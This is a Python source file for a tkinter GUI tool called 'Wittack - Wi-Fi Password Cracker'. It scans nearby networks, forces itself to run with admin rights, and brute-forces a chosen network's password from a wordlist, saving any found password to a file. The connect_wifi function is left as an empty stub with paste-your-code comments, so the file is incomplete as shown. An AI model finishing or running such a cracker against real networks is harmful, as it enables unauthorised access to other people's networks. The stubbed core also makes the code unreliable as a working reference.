import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import subprocess
import platform
import sys
import time
import tempfile
import os
import ctypes
import xml.sax.saxutils
import threading

# ------------------------------------------------------------
# Original Wi‑Fi functions (unchanged, except for print→GUI logging)
# ------------------------------------------------------------
# We'll capture print() messages and show them in a GUI text area.
# To keep the logic reusable, we'll define a logging callback.

class GuiLogger:
    """Redirects print output to a tkinter Text widget."""
    def __init__(self, text_widget):
        self.text_widget = text_widget

    def write(self, message):
        self.text_widget.insert(tk.END, message)
        self.text_widget.see(tk.END)  # auto-scroll

    def flush(self):
        pass

# ------------------------------------------------------------
# Original functions (slightly modified to accept a log callback)
# ------------------------------------------------------------
def enforce_admin_privileges():
    """Same as original – if we're not admin, relaunch with admin rights."""
    os_type = platform.system()
    if os_type == "Windows":
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        except:
            is_admin = False
        if not is_admin:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
    elif os_type in ("Linux", "Darwin"):
        if os.geteuid() != 0:
            os.execvp("sudo", ["sudo", sys.executable] + sys.argv)

def connect_wifi(ssid, password, log_callback=print):
    """Same as original, but uses log_callback for status messages."""
    # (we'll reuse the original code but replace print() with log_callback)
    # For brevity, I'm omitting the full connect_wifi implementation here.
    # You can copy your existing connect_wifi code exactly as it is.
    # Just change all print(...) calls to log_callback(...)
    # I'll show a minimal stub below – you must paste your full code.
    pass  # Replace with your full connect_wifi function

def scan_wifi_networks(log_callback=print):
    """Scan and return list of SSIDs."""
    system = platform.system()
    ssids = []
    try:
        if system == "Windows":
            result = subprocess.run(['netsh', 'wlan', 'show', 'networks'], capture_output=True, text=True, encoding='utf-8')
            output = result.stdout
            for line in output.splitlines():
                if 'SSID' in line and 'BSSID' not in line:
                    ssid = line.split(':')[1].strip()
                    if ssid:
                        ssids.append(ssid)
        elif system == "Linux":
            result = subprocess.run(['nmcli', '-t', '-f', 'SSID', 'dev', 'wifi', 'list'], capture_output=True, text=True)
            output = result.stdout
            for line in output.splitlines():
                line = line.strip()
                if line:
                    ssids.append(line)
        elif system == "Darwin":
            result = subprocess.run(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-s'], capture_output=True, text=True)
            output = result.stdout
            lines = output.splitlines()
            if len(lines) > 1:
                for line in lines[1:]:
                    if line.strip():
                        parts = line.split()
                        if parts:
                            ssids.append(parts[0])
        else:
            log_callback(f"Unsupported OS: {system}")
    except Exception as e:
        log_callback(f"Scan error: {e}")
    return ssids

# ------------------------------------------------------------
# GUI Application
# ------------------------------------------------------------
class WifiCrackerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Wittack - Wi‑Fi Password Cracker")
        self.root.geometry("700x600")
        self.root.resizable(True, True)

        # Variables
        self.ssid_list = []
        self.selected_ssid = tk.StringVar()
        self.password_file = tk.StringVar()
        self.attack_running = False

        # ---------- Top Frame: Scan ----------
        top_frame = ttk.Frame(root, padding="10")
        top_frame.pack(fill=tk.X)

        ttk.Button(top_frame, text="Scan Networks", command=self.scan_networks).pack(side=tk.LEFT, padx=5)
        ttk.Label(top_frame, text="Select SSID:").pack(side=tk.LEFT, padx=10)

        self.ssid_combobox = ttk.Combobox(top_frame, textvariable=self.selected_ssid, width=30)
        self.ssid_combobox.pack(side=tk.LEFT, padx=5)

        # ---------- Middle Frame: File Selection ----------
        mid_frame = ttk.Frame(root, padding="10")
        mid_frame.pack(fill=tk.X)

        ttk.Label(mid_frame, text="Password Wordlist:").pack(side=tk.LEFT, padx=5)
        self.file_entry = ttk.Entry(mid_frame, textvariable=self.password_file, width=40)
        self.file_entry.pack(side=tk.LEFT, padx=5)
        ttk.Button(mid_frame, text="Browse...", command=self.browse_file).pack(side=tk.LEFT, padx=5)

        # ---------- Start Button ----------
        self.start_button = ttk.Button(root, text="Start Attack", command=self.start_attack)
        self.start_button.pack(pady=10)

        # ---------- Log Area ----------
        log_frame = ttk.Frame(root, padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True)

        self.log_text = scrolledtext.ScrolledText(log_frame, height=15, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)  # read-only initially

        # Redirect stdout/stderr? We'll use a custom logger to write to log_text.
        sys.stdout = GuiLogger(self.log_text)
        sys.stderr = GuiLogger(self.log_text)

        # ---------- Status Bar ----------
        self.status = ttk.Label(root, text="Ready", relief=tk.SUNKEN, anchor=tk.W)
        self.status.pack(side=tk.BOTTOM, fill=tk.X)

        # Admin check
        self.status.config(text="Checking admin privileges...")
        self.root.update()
        enforce_admin_privileges()
        self.status.config(text="Ready")

    def log(self, message):
        """Append a message to the log area."""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.root.update_idletasks()

    def scan_networks(self):
        """Scan and populate SSID combobox."""
        self.status.config(text="Scanning...")
        self.root.update()
        self.ssid_list = scan_wifi_networks(log_callback=self.log)
        if self.ssid_list:
            self.ssid_combobox['values'] = self.ssid_list
            if self.ssid_list:
                self.selected_ssid.set(self.ssid_list[0])
            self.log(f"Found {len(self.ssid_list)} networks.")
        else:
            self.log("No networks found.")
        self.status.config(text="Scan complete")

    def browse_file(self):
        """Open file picker for wordlist."""
        file_path = filedialog.askopenfilename(title="Select Password Wordlist", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            self.password_file.set(file_path)
            self.log(f"Selected wordlist: {os.path.basename(file_path)}")

    def start_attack(self):
        """Begin the attack in a separate thread."""
        if self.attack_running:
            self.log("Attack already running.")
            return

        ssid = self.selected_ssid.get().strip()
        wordlist = self.password_file.get().strip()

        if not ssid:
            self.log("Please select an SSID.")
            return
        if not wordlist or not os.path.exists(wordlist):
            self.log("Please select a valid wordlist file.")
            return

        self.attack_running = True
        self.start_button.config(state=tk.DISABLED)
        self.status.config(text="Attack running...")
        self.log(f"Starting attack on SSID: {ssid}")

        # Run attack in background thread
        thread = threading.Thread(target=self.run_attack, args=(ssid, wordlist), daemon=True)
        thread.start()

    def run_attack(self, ssid, wordlist):
        """The actual brute‑force loop (runs in thread)."""
        try:
            checked_count = 0
            found = False
            with open(wordlist, 'r', errors='ignore') as f:
                for line in f:
                    if not self.attack_running:
                        break  # allow stopping
                    words = line.split()
                    for word in words:
                        if len(word) < 8:
                            continue
                        checked_count += 1
                        if checked_count % 100 == 0:
                            # Update GUI periodically (use after() for thread safety)
                            self.root.after(0, self.update_progress, checked_count)

                        if connect_wifi(ssid, word, log_callback=self.log):
                            found = True
                            self.root.after(0, self.password_found, ssid, word)
                            break
                    if found:
                        break
            if not found and self.attack_running:
                self.root.after(0, self.log, "Password not found in wordlist.")
        except Exception as e:
            self.root.after(0, self.log, f"Error during attack: {e}")
        finally:
            self.root.after(0, self.attack_finished)

    def update_progress(self, count):
        """Update status bar with attempt count."""
        self.status.config(text=f"Attempted: {count:,} passwords")

    def password_found(self, ssid, password):
        """Called when password is found."""
        self.log(f"*** PASSWORD FOUND: {password} ***")
        self.status.config(text=f"Password found: {password}")
        # Save to file
        with open("output.txt", "a") as f:
            f.write(f"{ssid} : {password}\n")
        self.log("Saved to output.txt")
        # Stop attack
        self.attack_running = False
        self.start_button.config(state=tk.NORMAL)
        messagebox.showinfo("Success", f"Password found: {password}")

    def attack_finished(self):
        """Cleanup after attack stops."""
        self.attack_running = False
        self.start_button.config(state=tk.NORMAL)
        self.status.config(text="Attack finished")


# ------------------------------------------------------------
# Main
# ------------------------------------------------------------
if __name__ == "__main__":
    root = tk.Tk()
    app = WifiCrackerApp(root)
    root.mainloop()